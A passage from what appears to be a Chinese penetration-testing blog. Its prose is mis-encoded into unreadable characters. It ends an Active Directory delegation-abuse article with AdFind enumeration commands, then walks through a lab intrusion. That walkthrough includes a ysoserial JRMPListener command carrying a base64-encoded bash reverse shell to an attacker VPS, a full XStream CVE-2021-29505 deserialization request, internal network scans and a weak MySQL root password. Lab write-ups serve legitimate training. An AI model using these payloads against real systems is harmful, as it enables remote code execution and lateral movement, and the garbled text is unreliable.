class="line">3ï¼‰æœåŠ¡Aåˆ©ç”¨S4u2Proxyåè®®ä»¥ç”¨æˆ·èº«ä»½å‘KDCè¯·æ±‚è®¿é—®æœåŠ¡Bçš„å¯è½¬å‘STï¼ˆä¸Šä¸€æ­¥è·å¾—çš„ä¸å¯è½¬å‘STæ”¾åœ¨è¯·æ±‚åŒ…çš„AddtionTicketä¸­ï¼‰ã€‚KDCè¿”å›è®¿é—®æœåŠ¡Bçš„å¯è½¬å‘STã€‚</span><br><span class="line">4ï¼‰æœåŠ¡Aç”¨ä¸Šä¸€æ­¥è·å¾—å¯è½¬å‘STè®¿é—®æœåŠ¡B</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<strong>åŸŸç”¨æˆ·</strong>æ·»åŠ ä¸€ä¸ª<strong>æœºå™¨è´¦æˆ·</strong>ä½œä¸ºæœåŠ¡1ï¼Œæ³¨æ„æ˜¯æœºå™¨è´¦æˆ·ï¼Œä¸æ˜¯æ™®é€šè´¦æˆ·ï¼Œæ™®é€šè´¦æˆ·æ²¡æœ‰SPNï¼Œå› ä¸ºS4U2selfåè®®ä¼šç”¨åˆ°SPNï¼Œè€Œä¸”é€šè¿‡S4U2Selfå¾—åˆ°çš„STæœåŠ¡ç¥¨è¯æ˜¯<strong>ä¸å¯è¢«è½¬å‘</strong>çš„ï¼Œè€ŒS4U2Proxyçš„ä½œç”¨å°±æ˜¯å°†å¯è½¬å‘çš„STç¥¨æ®è½¬å‘åˆ°å…¶ä»–æœåŠ¡è¿›è¡Œå§”æ´¾è®¤è¯çš„ï¼Œä½†æ˜¯åœ¨åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾è¿‡ç¨‹ä¸­ï¼Œä¸å¯è½¬å‘çš„STä»å¯ä»¥é€šè¿‡S4U2Proxyè½¬å‘åˆ°å…¶ä»–æœåŠ¡è¿›è¡Œå§”æ´¾è®¤è¯ï¼Œå¹¶ä¸”æœ€åè¿˜ä¼šè¿”å›ä¸€å¼ å¯è½¬å‘çš„STæœåŠ¡ç¥¨è¯ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨æœåŠ¡2ä¸Šé…ç½®å…è®¸æœåŠ¡1çš„èµ„æºçº¦æŸå§”æ´¾ï¼Œå°±å¯ä»¥é€šè¿‡æœåŠ¡1åˆ©ç”¨S4U2selfå‘KDCè¯·æ±‚ç”¨äºè®¿é—®è‡ªèº«çš„ç¥¨æ®ï¼Œåœ¨ä½¿ç”¨S4U2Proxyè½¬å‘æ­¤ç¥¨æ®å»è¯·æ±‚è®¿é—®æœåŠ¡2çš„ç¥¨æ®ï¼Œæœ€ç»ˆå°±å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ç”¨æˆ·å»è®¿é—®æœåŠ¡2äº†</p><p>é€šè¿‡èµ„æºçº¦æŸå§”æ´¾å¯ä»¥é€šè¿‡æ™®é€šåŸŸç”¨æˆ·æƒé™ä»¥ç®¡ç†å‘˜çš„èº«ä»½å»è®¿é—®ç‰¹å®šä¸»æœºçš„æœåŠ¡(cifsç­‰)ï¼Œå¯ä»¥å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä½†æ˜¯ä¸èƒ½å®Œå…¨å…·æœ‰åŸŸç®¡çš„æ‰€æœ‰æƒé™(å¦‚è¿›è¡Œdcsyncç­‰)ï¼Œæˆ–è€…åˆ©ç”¨èµ„æºçº¦æŸå§”æ´¾æ¨ªå‘æ‹¿ä¸‹æ‰€æœ‰è¢«è¯¥æ™®é€šåŸŸç”¨æˆ·æ‹‰è¿›åŸŸå†…çš„æœºå™¨æƒé™</p><p>å¤ç°é…ç½®ï¼šå‚è€ƒ<a href="https://developer.aliyun.com/article/1228243?spm=a2c6h.24874632.expert-profile.6.2fe45662aTMdZv">https://developer.aliyun.com/article/1228243?spm=a2c6h.24874632.expert-profile.6.2fe45662aTMdZv</a></p><p>ç”¨ä¸€ä¸ªåŸŸç”¨æˆ·test2å°†æœºå™¨åŠ å…¥åŸŸä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999430332-a17c569a-b930-4f65-8b0b-5d58b9465627.png"></p><p>å»æŸ¥çœ‹æœºå™¨ç”¨æˆ·çš„mS-DS-CreatorSIDå±æ€§ï¼ŒåŸŸç”¨æˆ·æ‹‰è¿›æ¥çš„éƒ½æœ‰è¿™ä¸ªå±æ€§ï¼Œå¦‚æœæ²¡æœ‰è¯´æ˜æ˜¯è¢«åŸŸç®¡ç†å‘˜æ‹‰è¿›æ¥åˆ°åŸŸå†…ä¸­çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999447984-aeb2d36a-512f-4120-9db2-77b5a9523dc4.png"></p><h3 id="åˆ©ç”¨æ¡ä»¶ï¼š-2"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h3><p>1.æœºå™¨è´¦æˆ·ï¼šæ˜¯ç”±æŸä¸ªåŸŸç”¨æˆ·åˆ›å»ºçš„ä¸»æœºï¼Œåªè¦æ‹¿ä¸‹è¿™ä¸ªåŸŸè´¦æˆ·ï¼Œé‚£ä¹ˆå°±èƒ½æ‹¿ä¸‹è¿™ä¸ªåŸŸç”¨æˆ·æ‰€åˆ›å»ºçš„æ‰€æœ‰æœºå™¨è´¦æˆ·çš„æœ€é«˜æƒé™ï¼ˆé»˜è®¤æ¯ä¸ªåŸŸç”¨æˆ·èƒ½åˆ›10ä¸ªæœºå™¨è´¦æˆ·ï¼‰</p><p>2.æ‹¥æœ‰ä¸€ä¸ªæœ‰æƒä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„åŸŸç”¨æˆ·è´¦å·å¯†ç (å°†æœºå™¨æ‹‰è¿›åŸŸçš„åŸŸç”¨æˆ·)ã€æˆ–è€…åœ¨<strong>account operators</strong>ç»„å†…çš„åŸŸç”¨æˆ·</p><p>3.åŸŸæ§éœ€è¦æ˜¯server2012å’Œ2012 R2ä»¥ä¸Šçš„ï¼ˆå› ä¸º2008åŠä»¥ä¸‹æ²¡æœ‰msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼‰</p><p>4.ä»»æ„ç”¨æˆ·å¯¹è¯¥ä¸»æœºçš„å±æ€§å…·æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·å°±å¯ä»¥å¯¹è¯¥ä¸»æœºè¿›è¡Œæ”»å‡»ï¼Œæ‰€ä»¥å¯ä»¥æšä¸¾åŸŸå†…ACLç­–ç•¥ï¼ŒæŸ¥çœ‹å“ªäº›å¯¹ä¸»æœºæœ‰GenericAllæƒé™ï¼ŒGenericWriteã€WritePropertyã€WriteDaclç­‰ç­‰æƒé™ï¼Œéƒ½æ˜¯å¯ä»¥çš„</p><p>åˆ¤æ–­æ˜¯å¦æœ‰åˆ©ç”¨æ¡ä»¶ï¼š</p><p>æŸ¥è¯¢è¢«åŸŸç”¨æˆ·åˆ›å»ºçš„æœºå™¨è´¦æˆ·åˆ—è¡¨:</p><p>shell AdFind.exe -b â€œDC&#x3D;xiaodi,DC&#x3D;localâ€ -f â€œ(&amp;(samAccountType&#x3D;805306369))â€ cn mS-DS-CreatorSID</p><p>æ ¹æ®æŸ¥è¯¢å‡ºæ¥çš„sidæ‰¾å‡ºå¯¹åº”çš„ç”¨æˆ·åï¼š</p><p>shell AdFind.exe -b â€œDC&#x3D;xiaodi,DC&#x3D;localâ€ -f â€œ(&amp;(objectsid&#x3D;S-1-5-21-1695257952-3088263962-2055235443-1104))â€ objectclass cn dn</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Delivery</title>
      <link href="/2025/03/13/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delivery/"/>
      <url>/2025/03/13/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delivery/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>fscanæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">./fscan_mac -h 39.99.133.230</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">39.99.133.230:21 open</span><br><span class="line">39.99.133.230:80 open</span><br><span class="line">39.99.133.230:22 open</span><br><span class="line">39.99.133.230:8080 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.133.230      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://39.99.133.230:8080 code:200 len:3655   title:å…¬å¸å‘è´§å•</span><br><span class="line">[+] ftp 39.99.133.230:21:anonymous</span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">å·²å®Œæˆ 4/4</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 13.720528092s</span><br></pre></td></tr></table></figure><p>æ‰«åˆ°ftpåŒ¿åç™»å½•,ftpä¸Šæœ‰pomæ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743074820228-b36de156-1899-48a2-acd8-db33a2e645cb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.7.2&lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ezjava&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;name&gt;ezjava&lt;/name&gt;</span><br><span class="line">    &lt;description&gt;ezjava&lt;/description&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.4.16&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>å®šä½åˆ°xstreamï¼Œæœ‰cve</p><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md</a></p><p>vpsç”¨JRMPListenerå¯åŠ¨ä¸€ä¸ªæ¶æ„çš„RMI Registry</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUueHgueHgueHgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç›‘å¬ä¸€ä¸‹å¼¹shellçš„ç«¯å£ï¼Œç„¶åå‘ç½‘ç«™ä¼ pocï¼Œæˆ‘è¿™é‡Œç”¨çš„9999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.133.230:8080</span><br><span class="line">Content-Length: 105</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.133.230:8080</span><br><span class="line">Referer: http://39.99.133.230:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;VPS_IP&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;VPS_IP&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075368101-0510c6cd-2759-4664-97a7-6975de2a14b0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075377485-aa07bec5-f5dc-46bd-b9ba-432e1725de5b.png"></p><p>æ‰¾ä¸€ä¸‹flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075461534-faec4ff4-bf3e-4dfa-b115-418ffca6a696.png"></p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æ¥ç€ä¸Šä»£ç†å’Œæ‰«æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743075599992-604cddcf-cbc0-472c-96d9-916814682ba6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> ./fscan -h 172.22.13.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.13.14    is alive</span><br><span class="line">(icmp) Target 172.22.13.6     is alive</span><br><span class="line">(icmp) Target 172.22.13.28    is alive</span><br><span class="line">(icmp) Target 172.22.13.57    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.13.14:22 open</span><br><span class="line">172.22.13.14:21 open</span><br><span class="line">172.22.13.28:3306 open</span><br><span class="line">172.22.13.28:445 open</span><br><span class="line">172.22.13.6:445 open</span><br><span class="line">172.22.13.6:139 open</span><br><span class="line">172.22.13.28:139 open</span><br><span class="line">172.22.13.6:135 open</span><br><span class="line">172.22.13.28:80 open</span><br><span class="line">172.22.13.57:80 open</span><br><span class="line">172.22.13.57:22 open</span><br><span class="line">172.22.13.14:80 open</span><br><span class="line">172.22.13.6:88 open</span><br><span class="line">172.22.13.28:135 open</span><br><span class="line">172.22.13.14:8080 open</span><br><span class="line">172.22.13.28:8000 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.13.6</span><br><span class="line">   [-&gt;]WIN-DC</span><br><span class="line">   [-&gt;]172.22.13.6</span><br><span class="line">[*] WebTitle http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.13.28       code:200 len:2525   title:æ¬¢è¿ç™»å½•OAåŠå…¬å¹³å°</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.13.28</span><br><span class="line">   [-&gt;]WIN-HAUWOLAO</span><br><span class="line">   [-&gt;]172.22.13.28</span><br><span class="line">[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC         </span><br><span class="line">[*] WebTitle http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] WebTitle http://172.22.13.14:8080  code:200 len:3655   title:å…¬å¸å‘è´§å•</span><br><span class="line">[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.</span><br><span class="line">[+] ftp 172.22.13.14:21:anonymous </span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[+] mysql 172.22.13.28:3306:root 123456</span><br><span class="line">å·²å®Œæˆ 16/16</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.6 dc</span><br><span class="line">172.22.13.14 æœ¬æœº</span><br><span class="line">172.22.13.57 nfs</span><br><span class="line">172.22.13.28 mysql</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰mysqlå¼±å£ä»¤ï¼ŒåŠ ä¸ªå…¨å±€ä»£ç†è¿ä¸Šå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077331885-026d28ee-0a7b-4c04-97ad-8edaeb256c5c.png"></p><p>çœ‹ä¸€ä¸‹secure_file_privï¼Œå‘ç°å¯ä»¥å†™æ–‡ä»¶</p><p><img 